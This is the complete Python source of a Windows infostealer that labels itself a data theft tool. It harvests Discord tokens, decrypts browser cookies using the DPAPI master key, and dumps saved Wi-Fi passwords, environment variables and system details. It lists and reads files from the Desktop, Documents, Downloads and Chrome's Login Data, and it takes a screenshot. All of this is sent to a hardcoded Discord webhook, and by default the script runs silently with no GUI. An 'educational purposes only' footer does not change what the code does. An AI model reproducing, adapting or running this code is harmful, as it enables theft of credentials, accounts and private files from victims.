#!/usr/bin/env python3
"""
ULTIMATE SYSTEM DATA & DISCORD TOKEN GRABBER
Comprehensive data theft tool with GUI interface
"""

import os
import sys
import json
import sqlite3
import base64
import shutil
import zipfile
import requests
import platform
import logging
import threading
import io
import tempfile
import win32crypt
import subprocess
import re
import psutil
import socket
import uuid
import ctypes
import getpass
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from collections import OrderedDict
from typing import List, Dict, Optional, Tuple
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import webbrowser
import threading

# ==================== CONFIGURATION ====================
WEBHOOK_URL = "https://discord.com/api/webhooks/1469062823673073748/uua0LQ8_yGH_Xq6b9uQFNhAvwno-oWCHqb-hbrX-w2LDSGBV-JCs0vB0Hc0b4n4_QCnF"

# ==================== LOGGING SETUP ====================
logging.basicConfig(level=logging.CRITICAL)
logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())

# ==================== MAIN GRABBER CLASS ====================
class UltimateSystemGrabber:
    def __init__(self):
        self.webhook_url = WEBHOOK_URL
        self.all_data = {}
        self.captured_tokens = []
        
        # Regex patterns
        self.token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
        
        # System paths
        self.discord_paths = [
            os.path.join(os.getenv('APPDATA', ''), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'DiscordCanary'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'DiscordPTB'),
        ]
        
        self.browser_paths = {
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Opera': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable'),
        }

    # ==================== SYSTEM INFORMATION ====================
    def gather_system_info(self) -> Dict:
        """Collect comprehensive system information"""
        info = {}
        
        try:
            # Basic system info
            info['system'] = {
                'platform': platform.system(),
                'platform_version': platform.version(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'machine': platform.machine(),
                'python_version': platform.python_version(),
                'timestamp': datetime.now().isoformat()
            }
            
            # Network information
            info['network'] = {
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'mac_address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
                'interfaces': str(psutil.net_if_addrs())
            }
            
            # Hardware information
            info['hardware'] = {
                'memory_total': psutil.virtual_memory().total,
                'memory_available': psutil.virtual_memory().available,
                'cpu_count': psutil.cpu_count(),
                'cpu_freq': str(psutil.cpu_freq()),
                'disk_usage': str(psutil.disk_usage('/'))
            }
            
            # Running processes
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            info['processes'] = processes[:50]  # First 50 processes
            
            # Installed software (Windows registry)
            if platform.system() == "Windows":
                import winreg
                software_list = []
                try:
                    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
                    key = winreg.OpenKey(reg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
                    
                    for i in range(0, winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            software_list.append(name)
                        except WindowsError:
                            continue
                    info['installed_software'] = software_list[:100]
                except:
                    info['installed_software'] = ["Failed to retrieve"]
            
            # Environment variables
            info['environment'] = dict(os.environ)
            
            # WiFi passwords (Windows)
            if platform.system() == "Windows":
                wifi_profiles = []
                try:
                    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
                    profiles = re.findall(r': (.*)\r', data)
                    
                    for profile in profiles:
                        try:
                            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace")
                            password = re.findall(r'Key Content.*: (.*)\r', results)
                            if password:
                                wifi_profiles.append({
                                    'ssid': profile,
                                    'password': password[0]
                                })
                        except:
                            continue
                    info['wifi_passwords'] = wifi_profiles
                except:
                    info['wifi_passwords'] = ["Failed to retrieve"]
            
        except Exception as e:
            logger.error(f"System info gathering error: {e}")
            info['error'] = str(e)
        
        return info

    # ==================== TOKEN EXTRACTION ====================
    def get_master_key(self, browser_path: str) -> Optional[bytes]:
        """Extract browser master key"""
        try:
            local_state_path = os.path.join(browser_path, 'Local State')
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            logger.error(f"Master key error: {e}")
            return None

    def decrypt_value(self, buff: bytes, master_key: bytes) -> str:
        """Decrypt browser encrypted values"""
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            return ""

    def extract_browser_tokens(self) -> List[str]:
        """Extract tokens from all browsers"""
        all_tokens = []
        
        for browser_name, browser_path in self.browser_paths.items():
            if not os.path.exists(browser_path):
                continue
            
            try:
                master_key = self.get_master_key(browser_path)
                if not master_key:
                    continue
                
                # Find all profiles
                profiles = []
                for item in os.listdir(browser_path):
                    item_path = os.path.join(browser_path, item)
                    if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                        profiles.append(item)
                
                if not profiles:
                    profiles = ['']
                
                for profile in profiles:
                    profile_path = os.path.join(browser_path, profile)
                    
                    # LevelDB files
                    leveldb_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
                    if os.path.exists(leveldb_path):
                        for file in os.listdir(leveldb_path):
                            if file.endswith(('.ldb', '.log')):
                                file_path = os.path.join(leveldb_path, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        all_tokens.extend(self.token_pattern.findall(content))
                                except:
                                    pass
                    
                    # Cookies database
                    cookies_db = os.path.join(profile_path, 'Network', 'Cookies')
                    if os.path.exists(cookies_db):
                        try:
                            temp_db = os.path.join(tempfile.gettempdir(), 'temp_cookies.db')
                            shutil.copy2(cookies_db, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%'")
                            
                            for (encrypted_value,) in cursor.fetchall():
                                try:
                                    decrypted = self.decrypt_value(encrypted_value, master_key)
                                    if self.token_pattern.match(decrypted):
                                        all_tokens.append(decrypted)
                                except:
                                    pass
                            
                            conn.close()
                            os.remove(temp_db)
                        except Exception as e:
                            logger.error(f"Cookies DB error: {e}")
            
            except Exception as e:
                logger.error(f"Browser {browser_name} error: {e}")
        
        return list(set(all_tokens))

    def extract_discord_tokens(self) -> List[str]:
        """Extract from Discord desktop app"""
        tokens = []
        
        for discord_path in self.discord_paths:
            if not os.path.exists(discord_path):
                continue
            
            try:
                # Check storage files
                storage_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
                if os.path.exists(storage_path):
                    for file in os.listdir(storage_path):
                        if file.endswith('.ldb'):
                            file_path = os.path.join(storage_path, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    tokens.extend(self.token_pattern.findall(content))
                            except:
                                pass
            except Exception as e:
                logger.error(f"Discord path error: {e}")
        
        return list(set(tokens))

    # ==================== FILE STEALING ====================
    def steal_sensitive_files(self) -> Dict:
        """Steal sensitive files from system"""
        stolen_files = {}
        
        # Common sensitive file locations
        file_locations = {
            'Desktop': os.path.join(os.path.expanduser('~'), 'Desktop'),
            'Documents': os.path.join(os.path.expanduser('~'), 'Documents'),
            'Downloads': os.path.join(os.path.expanduser('~'), 'Downloads'),
            'Chrome_Passwords': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            'Discord_Tokens': os.path.join(os.getenv('APPDATA', ''), 'Discord', 'Local Storage', 'leveldb'),
        }
        
        for category, path in file_locations.items():
            if os.path.exists(path):
                try:
                    if os.path.isfile(path):
                        # Read small files
                        if os.path.getsize(path) < 10 * 1024 * 1024:  # 10MB limit
                            with open(path, 'rb') as f:
                                content = f.read()
                                stolen_files[category] = {
                                    'path': path,
                                    'content_base64': base64.b64encode(content).decode('utf-8'),
                                    'size': len(content)
                                }
                    elif os.path.isdir(path):
                        # List directory contents
                        files = []
                        for root, dirs, filenames in os.walk(path):
                            for filename in filenames[:100]:  # Limit to 100 files
                                file_path = os.path.join(root, filename)
                                files.append({
                                    'name': filename,
                                    'path': file_path,
                                    'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0
                                })
                        stolen_files[category] = {
                            'path': path,
                            'file_count': len(files),
                            'files': files[:50]  # Send first 50 files
                        }
                except Exception as e:
                    stolen_files[category] = {'error': str(e)}
        
        return stolen_files

    # ==================== SCREENSHOT CAPTURE ====================
    def capture_screenshot(self) -> Optional[str]:
        """Capture screen and return base64"""
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            temp_path = os.path.join(tempfile.gettempdir(), f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
            screenshot.save(temp_path)
            
            with open(temp_path, 'rb') as f:
                screenshot_data = base64.b64encode(f.read()).decode('utf-8')
            
            os.remove(temp_path)
            return screenshot_data
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
            return None

    # ==================== WEBHOOK SENDING ====================
    def send_to_webhook(self, data: Dict) -> bool:
        """Send all collected data to Discord webhook"""
        if not self.webhook_url:
            logger.error("No webhook URL configured")
            return False
        
        try:
            # Prepare comprehensive embed
            embed = {
                "title": "🔓 ULTIMATE SYSTEM DATA GRAB - COMPLETE REPORT",
                "color": 0xFF0000,
                "fields": [],
                "footer": {
                    "text": f"Ultimate Grabber v2.0 • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                },
                "timestamp": datetime.now().isoformat()
            }
            
            # System info
            if 'system' in data:
                sys_info = data['system']
                embed["fields"].append({
                    "name": "🖥️ SYSTEM INFORMATION",
                    "value": f"**User:** {sys_info.get('username', 'N/A')}\n"
                            f"**Hostname:** {sys_info.get('hostname', 'N/A')}\n"
                            f"**OS:** {sys_info.get('platform', 'N/A')} {sys_info.get('platform_version', 'N/A')}\n"
                            f"**CPU:** {sys_info.get('processor', 'N/A')[:100]}...\n"
                            f"**Architecture:** {sys_info.get('architecture', 'N/A')}\n"
                            f"**Python:** {sys_info.get('python_version', 'N/A')}",
                    "inline": False
                })
            
            # Network info
            if 'network' in data:
                net_info = data['network']
                embed["fields"].append({
                    "name": "🌐 NETWORK INFORMATION",
                    "value": f"**IP Address:** {net_info.get('ip_address', 'N/A')}\n"
                            f"**MAC Address:** {net_info.get('mac_address', 'N/A')}\n",
                    "inline": True
                })
            
            # Tokens
            if 'tokens' in data and data['tokens']:
                tokens = data['tokens']
                token_list = "\n".join([f"`{token}`" for token in tokens[:5]])
                if not token_list: token_list = "No tokens captured"
                embed["fields"].append({
                    "name": f"🔑 DISCORD TOKENS ({len(tokens)})",
                    "value": token_list,
                    "inline": False
                })
            
            # WiFi passwords
            if 'system' in data and 'wifi_passwords' in data['system'] and data['system']['wifi_passwords']:
                wifi_info = data['system']['wifi_passwords']
                if isinstance(wifi_info, list) and wifi_info and isinstance(wifi_info[0], dict):
                    wifi_list = "\n".join([f"**{w.get('ssid', 'Unknown')}:** `{w.get('password', 'N/A')}`" for w in wifi_info[:5]])
                    if wifi_list:
                        embed["fields"].append({
                            "name": f"📶 WIFI PASSWORDS ({len(wifi_info)})",
                            "value": wifi_list,
                            "inline": False
                        })
            
            # Hardware
            if 'system' in data and 'hardware' in data['system']:
                hw_info = data['system']['hardware']
                embed["fields"].append({
                    "name": "💾 HARDWARE SPECS",
                    "value": f"**RAM:** {hw_info.get('memory_total', 0) // (1024**3)}GB Total\n"
                            f"**CPU Cores:** {hw_info.get('cpu_count', 'N/A')}\n"
                            f"**Disk Usage:** {hw_info.get('disk_usage', 'N/A')[:100]}...",
                    "inline": True
                })
            
            # Running processes count
            if 'system' in data and 'processes' in data['system']:
                proc_count = len(data['system']['processes'])
                embed["fields"].append({
                    "name": "📊 RUNNING PROCESSES",
                    "value": f"**Count:** {proc_count} processes",
                    "inline": True
                })
            
            # Installed software count
            if 'system' in data and 'installed_software' in data['system']:
                software_count = len(data['system']['installed_software'])
                embed["fields"].append({
                    "name": "📦 INSTALLED SOFTWARE",
                    "value": f"**Count:** {software_count} applications",
                    "inline": True
                })
            
            # File stealing results
            if 'stolen_files' in data:
                file_data = data['stolen_files']
                total_files = sum(len(v.get('files', [])) if isinstance(v, dict) else 0 for v in file_data.values())
                embed["fields"].append({
                    "name": "📁 STOLEN FILES SUMMARY",
                    "value": f"**Directories scanned:** {len(file_data)}\n"
                            f"**Total files listed:** {total_files}",
                    "inline": True
                })
            
            # Handle Screenshot and binary files
            files = {}
            if 'screenshot' in data and data['screenshot']:
                try:
                    import io
                    screenshot_bytes = base64.b64decode(data['screenshot'])
                    files["screenshot.png"] = ("screenshot.png", io.BytesIO(screenshot_bytes), "image/png")
                    embed["image"] = {"url": "attachment://screenshot.png"}
                except Exception as e:
                    logger.error(f"Screenshot attach error: {e}")
            
            payload = {
                "username": "ULTIMATE SYSTEM GRABBER",
                "avatar_url": "https://cdn.discordapp.com/attachments/1068327379611885719/1068327683024363630/hacker.png",
                "embeds": [embed],
                "content": f"@everyone **COMPLETE SYSTEM GRAB COMPLETED** - {data['system'].get('username', 'Unknown')} @ {data['system'].get('hostname', 'Unknown')}"
            }
            
            # Send to webhook
            if files:
                response = requests.post(
                    self.webhook_url,
                    data={"payload_json": json.dumps(payload)},
                    files=files,
                    timeout=30
                )
            else:
                response = requests.post(
                    self.webhook_url,
                    json=payload,
                    timeout=30
                )
            
            if response.status_code in [200, 204]:
                logger.info(f"Data sent successfully to webhook")
                
                # Send token file separately if too many tokens
                if 'tokens' in data and len(data['tokens']) > 5:
                    token_content = '\n'.join(data['tokens'])
                    requests.post(
                        self.webhook_url,
                        files={'file': ('tokens.txt', io.BytesIO(token_content.encode()), 'text/plain')}
                    )
                
                return True
            else:
                logger.error(f"Webhook error: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            logger.error(f"Webhook sending failed: {e}")
            return False

    # ==================== MAIN EXECUTION ====================
    def execute_full_grab(self) -> Dict:
        # Gather all data
        system_data = self.gather_system_info()
        self.all_data.update(system_data)
        
        browser_tokens = self.extract_browser_tokens()
        discord_tokens = self.extract_discord_tokens()
        self.all_data['tokens'] = list(set(browser_tokens + discord_tokens))
        
        self.all_data['stolen_files'] = self.steal_sensitive_files()
        
        self.all_data['screenshot'] = self.capture_screenshot()
        
        self.send_to_webhook(self.all_data)
        
        return self.all_data

# ==================== GRAPHICAL USER INTERFACE ====================
class GrabberGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Ultimate System Data Grabber v2.0")
        self.root.geometry("900x700")
        self.root.configure(bg='#1e1e1e')
        
        self.grabber = UltimateSystemGrabber()
        self.running = False
        
        self.setup_ui()
        
    def setup_ui(self):
        # Title
        title_frame = tk.Frame(self.root, bg='#1e1e1e')
        title_frame.pack(pady=20)
        
        tk.Label(
            title_frame,
            text="⚡ ULTIMATE SYSTEM DATA GRABBER",
            font=("Arial", 20, "bold"),
            fg="#00ff00",
            bg='#1e1e1e'
        ).pack()
        
        tk.Label(
            title_frame,
            text="Complete System Information & Token Extraction Tool",
            font=("Arial", 10),
            fg="#cccccc",
            bg='#1e1e1e'
        ).pack()
        
        # Status Frame
        status_frame = tk.LabelFrame(self.root, text="Status", font=("Arial", 12, "bold"),
                                    fg="#00ffff", bg='#2d2d2d', bd=2)
        status_frame.pack(fill="x", padx=20, pady=10)
        
        self.status_text = scrolledtext.ScrolledText(
            status_frame,
            height=15,
            width=80,
            font=("Consolas", 9),
            bg='#1e1e1e',
            fg="#00ff00",
            insertbackground='white'
        )
        self.status_text.pack(padx=10, pady=10)
        self.status_text.insert(tk.END, "[*] System ready for data extraction\n")
        self.status_text.insert(tk.END, f"[*] Webhook: {self.grabber.webhook_url[:50]}...\n")
        self.status_text.insert(tk.END, "[*] Press START to begin full system grab\n")
        
        # Control Buttons
        button_frame = tk.Frame(self.root, bg='#1e1e1e')
        button_frame.pack(pady=20)
        
        self.start_button = tk.Button(
            button_frame,
            text="🚀 START FULL GRAB",
            font=("Arial", 12, "bold"),
            bg="#00aa00",
            fg="white",
            padx=30,
            pady=10,
            command=self.start_grab,
            state=tk.NORMAL
        )
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = tk.Button(
            button_frame,
            text="⏹️ STOP",
            font=("Arial", 12, "bold"),
            bg="#aa0000",
            fg="white",
            padx=30,
            pady=10,
            command=self.stop_grab,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.LEFT, padx=10)
        
        self.save_button = tk.Button(
            button_frame,
            text="💾 SAVE LOG",
            font=("Arial", 12, "bold"),
            bg="#0055aa",
            fg="white",
            padx=30,
            pady=10,
            command=self.save_log
        )
        self.save_button.pack(side=tk.LEFT, padx=10)
        
        # Progress Bar
        self.progress = ttk.Progressbar(
            self.root,
            orient="horizontal",
            length=800,
            mode="indeterminate"
        )
        self.progress.pack(pady=10)
        
        # Stats Frame
        stats_frame = tk.LabelFrame(self.root, text="Statistics", font=("Arial", 12, "bold"),
                                   fg="#ffff00", bg='#2d2d2d', bd=2)
        stats_frame.pack(fill="x", padx=20, pady=10)
        
        self.stats_text = tk.Text(
            stats_frame,
            height=4,
            width=80,
            font=("Consolas", 9),
            bg='#1e1e1e',
            fg="#ffff00"
        )
        self.stats_text.pack(padx=10, pady=10)
        self.stats_text.insert(tk.END, "Tokens Found: 0\n")
        self.stats_text.insert(tk.END, "System Info: Not gathered\n")
        self.stats_text.insert(tk.END, "Files Stolen: 0\n")
        self.stats_text.insert(tk.END, "Status: Ready\n")
        
        # Footer
        footer = tk.Label(
            self.root,
            text="⚠️ For educational purposes only. Use at your own risk.",
            font=("Arial", 8),
            fg="#ff5555",
            bg='#1e1e1e'
        )
        footer.pack(pady=10)
        
        # Redirect logging to GUI
        self.setup_logging()
    
    def setup_logging(self):
        class TextHandler(logging.Handler):
            def __init__(self, text_widget):
                super().__init__()
                self.text_widget = text_widget
            
            def emit(self, record):
                msg = self.format(record)
                def append():
                    self.text_widget.insert(tk.END, msg + '\n')
                    self.text_widget.see(tk.END)
                self.text_widget.after(0, append)
        
        text_handler = TextHandler(self.status_text)
        text_handler.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        text_handler.setFormatter(formatter)
        logger.addHandler(text_handler)
    
    def start_grab(self):
        if not self.running:
            self.running = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.progress.start(10)
            
            # Run grab in separate thread
            thread = threading.Thread(target=self.run_grab, daemon=True)
            thread.start()
    
    def stop_grab(self):
        self.running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.progress.stop()
        self.log_message("[!] Operation stopped by user")
    
    def run_grab(self):
        try:
            self.log_message("[*] Starting ULTIMATE SYSTEM GRAB...")
            
            # Execute full grab
            result = self.grabber.execute_full_grab()
            
            # Update statistics
            self.root.after(0, self.update_stats, result)
            
            self.log_message("[✓] GRAB COMPLETED SUCCESSFULLY!")
            self.log_message(f"[✓] {len(result.get('tokens', []))} tokens captured")
            self.log_message(f"[✓] Data sent to webhook")
            
        except Exception as e:
            self.log_message(f"[!] Error during grab: {e}")
        finally:
            self.root.after(0, self.grab_finished)
    
    def grab_finished(self):
        self.running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.progress.stop()
    
    def update_stats(self, result):
        self.stats_text.delete(1.0, tk.END)
        self.stats_text.insert(tk.END, f"Tokens Found: {len(result.get('tokens', []))}\n")
        self.stats_text.insert(tk.END, f"System Info: Gathered\n")
        
        file_count = 0
        if 'stolen_files' in result:
            for category, data in result['stolen_files'].items():
                if isinstance(data, dict) and 'files' in data:
                    file_count += len(data['files'])
        
        self.stats_text.insert(tk.END, f"Files Listed: {file_count}\n")
        self.stats_text.insert(tk.END, f"Status: Completed\n")
    
    def log_message(self, message):
        self.status_text.insert(tk.END, f"{message}\n")
        self.status_text.see(tk.END)
    
    def save_log(self):
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("All files", "*.*")]
        )
        if filename:
            with open(filename, 'w', encoding='utf-8') as f:
                log_content = self.status_text.get(1.0, tk.END)
                f.write(log_content)
            self.log_message(f"[✓] Log saved to {filename}")
    
    def run(self):
        self.root.mainloop()

# ==================== MAIN EXECUTION ====================
def main():
    """Main entry point with optional GUI"""
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--gui":
            app = GrabberGUI()
            app.run()
        else:
            grabber = UltimateSystemGrabber()
            grabber.execute_full_grab()
    
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")

if __name__ == "__main__":
    # Mapping of package names to their actual import names
    module_mapping = {
        'pycryptodome': 'Crypto',
        'pillow': 'PIL'
    }
    required_modules = ['requests', 'psutil', 'pycryptodome', 'pillow']
    
    missing = []
    for module in required_modules:
        import_name = module_mapping.get(module, module.replace('-', '_'))
        try:
            __import__(import_name)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"[!] Missing required modules: {', '.join(missing)}")
        print("[*] Install with: pip install " + " ".join(missing))
        sys.exit(1)
    
    main()
